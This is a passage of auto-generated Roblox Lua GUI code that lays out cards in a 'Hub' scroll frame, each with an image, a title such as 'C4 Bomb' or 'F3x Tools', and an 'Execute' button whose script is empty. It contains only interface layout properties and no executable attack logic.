G2L["45"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["46"] = Instance.new("UIStroke", G2L["45"]);
G2L["46"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["46"]["Thickness"] = 1.3;
G2L["46"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["47"] = Instance.new("ImageLabel", G2L["45"]);
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["47"]["Image"] = [[rbxassetid://98893207641774]];
G2L["47"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["48"] = Instance.new("UICorner", G2L["47"]);
G2L["48"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["49"] = Instance.new("UIGradient", G2L["47"]);
G2L["49"]["Rotation"] = 90;
G2L["49"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["4a"] = Instance.new("TextButton", G2L["45"]);
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["TextSize"] = 22;
G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Text"] = [[Execute]];
G2L["4a"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["4b"] = Instance.new("LocalScript", G2L["4a"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["4c"] = Instance.new("UICorner", G2L["4a"]);
G2L["4c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["4d"] = Instance.new("UICorner", G2L["45"]);
G2L["4d"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["4e"] = Instance.new("TextLabel", G2L["45"]);
G2L["4e"]["BorderSizePixel"] = 0;
G2L["4e"]["TextSize"] = 32;
G2L["4e"]["TextTransparency"] = 0.49;
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["BackgroundTransparency"] = 1;
G2L["4e"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["Text"] = [[Doge Army]];
G2L["4e"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["4f"] = Instance.new("Frame", G2L["2e"]);
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["4f"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["50"] = Instance.new("UIStroke", G2L["4f"]);
G2L["50"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["50"]["Thickness"] = 1.3;
G2L["50"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["51"] = Instance.new("ImageLabel", G2L["4f"]);
G2L["51"]["BorderSizePixel"] = 0;
G2L["51"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["51"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["51"]["Image"] = [[rbxassetid://112198609303505]];
G2L["51"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["51"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["52"] = Instance.new("UICorner", G2L["51"]);
G2L["52"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["53"] = Instance.new("UIGradient", G2L["51"]);
G2L["53"]["Rotation"] = 90;
G2L["53"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["54"] = Instance.new("TextButton", G2L["4f"]);
G2L["54"]["BorderSizePixel"] = 0;
G2L["54"]["TextSize"] = 22;
G2L["54"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["54"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["54"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["Text"] = [[Execute]];
G2L["54"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["55"] = Instance.new("LocalScript", G2L["54"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["56"] = Instance.new("UICorner", G2L["54"]);
G2L["56"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["57"] = Instance.new("UICorner", G2L["4f"]);
G2L["57"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["58"] = Instance.new("TextLabel", G2L["4f"]);
G2L["58"]["BorderSizePixel"] = 0;
G2L["58"]["TextSize"] = 32;
G2L["58"]["TextTransparency"] = 0.49;
G2L["58"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["58"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["58"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["58"]["BackgroundTransparency"] = 1;
G2L["58"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["58"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["58"]["Text"] = [[Dark Vex]];
G2L["58"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["59"] = Instance.new("Frame", G2L["2e"]);
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["59"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["5a"] = Instance.new("UIStroke", G2L["59"]);
G2L["5a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["5a"]["Thickness"] = 1.3;
G2L["5a"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["5b"] = Instance.new("ImageLabel", G2L["59"]);
G2L["5b"]["BorderSizePixel"] = 0;
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["5b"]["Image"] = [[rbxassetid://102024442717579]];
G2L["5b"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["5b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["5c"] = Instance.new("UICorner", G2L["5b"]);
G2L["5c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["5d"] = Instance.new("UIGradient", G2L["5b"]);
G2L["5d"]["Rotation"] = 90;
G2L["5d"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["5e"] = Instance.new("TextButton", G2L["59"]);
G2L["5e"]["BorderSizePixel"] = 0;
G2L["5e"]["TextSize"] = 22;
G2L["5e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5e"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["Text"] = [[Execute]];
G2L["5e"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["5f"] = Instance.new("LocalScript", G2L["5e"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["60"] = Instance.new("UICorner", G2L["5e"]);
G2L["60"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["61"] = Instance.new("UICorner", G2L["59"]);
G2L["61"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["62"] = Instance.new("TextLabel", G2L["59"]);
G2L["62"]["BorderSizePixel"] = 0;
G2L["62"]["TextSize"] = 32;
G2L["62"]["TextTransparency"] = 0.49;
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["62"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["BackgroundTransparency"] = 1;
G2L["62"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["Text"] = [[R6]];
G2L["62"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["63"] = Instance.new("Frame", G2L["2e"]);
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["63"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["64"] = Instance.new("UIStroke", G2L["63"]);
G2L["64"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["64"]["Thickness"] = 1.3;
G2L["64"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["65"] = Instance.new("ImageLabel", G2L["63"]);
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["65"]["Image"] = [[rbxassetid://138885605652898]];
G2L["65"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["66"] = Instance.new("UICorner", G2L["65"]);
G2L["66"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["67"] = Instance.new("UIGradient", G2L["65"]);
G2L["67"]["Rotation"] = 90;
G2L["67"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["68"] = Instance.new("TextButton", G2L["63"]);
G2L["68"]["BorderSizePixel"] = 0;
G2L["68"]["TextSize"] = 22;
G2L["68"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["68"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["68"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["68"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["Text"] = [[Execute]];
G2L["68"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["69"] = Instance.new("LocalScript", G2L["68"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["6a"] = Instance.new("UICorner", G2L["68"]);
G2L["6a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["6b"] = Instance.new("UICorner", G2L["63"]);
G2L["6b"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["6c"] = Instance.new("TextLabel", G2L["63"]);
G2L["6c"]["BorderSizePixel"] = 0;
G2L["6c"]["TextSize"] = 32;
G2L["6c"]["TextTransparency"] = 0.49;
G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["BackgroundTransparency"] = 1;
G2L["6c"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["6c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6c"]["Text"] = [[C4 Bomb]];
G2L["6c"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["6d"] = Instance.new("Frame", G2L["2e"]);
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["6d"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["6e"] = Instance.new("UIStroke", G2L["6d"]);
G2L["6e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6e"]["Thickness"] = 1.3;
G2L["6e"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["6f"] = Instance.new("ImageLabel", G2L["6d"]);
G2L["6f"]["BorderSizePixel"] = 0;
G2L["6f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6f"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["6f"]["Image"] = [[rbxassetid://115530999244225]];
G2L["6f"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["6f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6f"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["70"] = Instance.new("UICorner", G2L["6f"]);
G2L["70"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["71"] = Instance.new("UIGradient", G2L["6f"]);
G2L["71"]["Rotation"] = 90;
G2L["71"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["72"] = Instance.new("TextButton", G2L["6d"]);
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["TextSize"] = 22;
G2L["72"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["72"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Text"] = [[Execute]];
G2L["72"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["73"] = Instance.new("LocalScript", G2L["72"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["74"] = Instance.new("UICorner", G2L["72"]);
G2L["74"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["75"] = Instance.new("UICorner", G2L["6d"]);
G2L["75"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["76"] = Instance.new("TextLabel", G2L["6d"]);
G2L["76"]["BorderSizePixel"] = 0;
G2L["76"]["TextSize"] = 32;
G2L["76"]["TextTransparency"] = 0.49;
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["76"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["BackgroundTransparency"] = 1;
G2L["76"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["76"]["Text"] = [[F3x Tools]];
G2L["76"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["77"] = Instance.new("Frame", G2L["2e"]);
G2L["77"]["BorderSizePixel"] = 0;
G2L["77"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["77"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["77"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["77"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["78"] = Instance.new("UIStroke", G2L["77"]);
G2L["78"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["78"]["Thickness"] = 1.3;
G2L["78"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["79"] = Instance.new("ImageLabel", G2L["77"]);
G2L["79"]["BorderSizePixel"] = 0;
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["79"]["Image"] = [[rbxassetid://99949640024663]];
G2L["79"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["7a"] = Instance.new("UICorner", G2L["79"]);
G2L["7a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["7b"] = Instance.new("UIGradient", G2L["79"]);
G2L["7b"]["Rotation"] = 90;
G2L["7b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["7c"] = Instance.new("TextButton", G2L["77"]);
G2L["7c"]["BorderSizePixel"] = 0;
G2L["7c"]["TextSize"] = 22;
G2L["7c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["7c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7c"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7c"]["Text"] = [[Execute]];
G2L["7c"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["7d"] = Instance.new("LocalScript", G2L["7c"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["7e"] = Instance.new("UICorner", G2L["7c"]);
G2L["7e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["7f"] = Instance.new("UICorner", G2L["77"]);
G2L["7f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["80"] = Instance.new("TextLabel", G2L["77"]);
G2L["80"]["BorderSizePixel"] = 0;
G2L["80"]["TextSize"] = 32;
G2L["80"]["TextTransparency"] = 0.49;
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["80"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["BackgroundTransparency"] = 1;
G2L["80"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["80"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["80"]["Text"] = [[Death Sherif]];
G2L["80"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["81"] = Instance.new("Frame", G2L["2e"]);
G2L["81"]["BorderSizePixel"] = 0;
G2L["81"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["81"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["81"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["81"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["82"] = Instance.new("UIStroke", G2L["81"]);
G2L["82"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["82"]["Thickness"] = 1.3;
G2L["82"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["83"] = Instance.new("ImageLabel", G2L["81"]);
G2L["83"]["BorderSizePixel"] = 0;
G2L["83"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["83"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["83"]["Image"] = [[rbxassetid://92116086047708]];
G2L["83"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["83"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["83"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["84"] = Instance.new("UICorner", G2L["83"]);
G2L["84"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["85"] = Instance.new("UIGradient", G2L["83"]);
G2L["85"]["Rotation"] = 90;
G2L["85"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["86"] = Instance.new("TextButton", G2L["81"]);
G2L["86"]["BorderSizePixel"] = 0;
G2L["86"]["TextSize"] = 22;
G2L["86"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["86"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Text"] = [[Execute]];
G2L["86"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["87"] = Instance.new("LocalScript", G2L["86"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["88"] = Instance.new("UICorner", G2L["86"]);
G2L["88"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["89"] = Instance.new("UICorner", G2L["81"]);
G2L["89"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["8a"] = Instance.new("TextLabel", G2L["81"]);
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["TextSize"] = 32;
G2L["8a"]["TextTransparency"] = 0.49;
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["BackgroundTransparency"] = 1;
G2L["8a"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8a"]["Text"] = [[John Doe]];
G2L["8a"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["8b"] = Instance.new("Frame", G2L["2e"]);
G2L["8b"]["BorderSizePixel"] = 0;
G2L["8b"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["8b"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["8b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8b"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["8c"] = Instance.new("UIStroke", G2L["8b"]);
G2L["8c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["8c"]["Thickness"] = 1.3;
G2L["8c"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["8d"] = Instance.new("ImageLabel", G2L["8b"]);
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["8d"]["Image"] = [[rbxassetid://77063341160612]];
G2L["8d"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
